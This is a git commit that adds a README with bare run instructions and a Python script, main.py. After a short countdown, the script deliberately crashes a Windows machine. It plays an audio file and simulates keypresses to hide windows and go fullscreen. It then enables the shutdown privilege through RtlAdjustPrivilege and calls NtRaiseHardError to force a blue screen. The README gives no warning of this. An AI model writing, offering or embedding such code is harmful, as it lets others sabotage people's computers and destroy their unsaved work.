6ad47c0874e1109c20ed236d3b73fbab196663f9
hamy-os <hamzaalisic0@gmail.com>
2022-09-08 17:07:06 +0300

    feat: main code

---
+++ README.md
@@ -0,0 +1,5 @@
+# HOW TO RUN
+
+download the github repository
+run install_python.bat
+and then run start.bat
---
+++ main.py
@@ -0,0 +1,44 @@
+import webbrowser
+import time
+import subprocess
+import keyboard
+import os
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
+
+webbrowser.open(os.getcwd() + "\outro.mp3")
+time.sleep(0.25)
+keyboard.press_and_release("windows + m")
+keyboard.press_and_release("alt + tab")
+time.sleep(0.5)
+keyboard.press_and_release("f11")
+for zaky in range(10):
+    print("Shutting down in: " + str(10 - zaky) + " Seconds")
+    time.sleep(1)
+    
+
+print("Shutting down now!")
+time.sleep(0.5)
+nullptr = POINTER(c_int)()
+
+windll.ntdll.RtlAdjustPrivilege(
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int())
+)
+
+windll.ntdll.NtRaiseHardError(
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint())
+)
+print("Goodbye!")
+time.sleep(7)
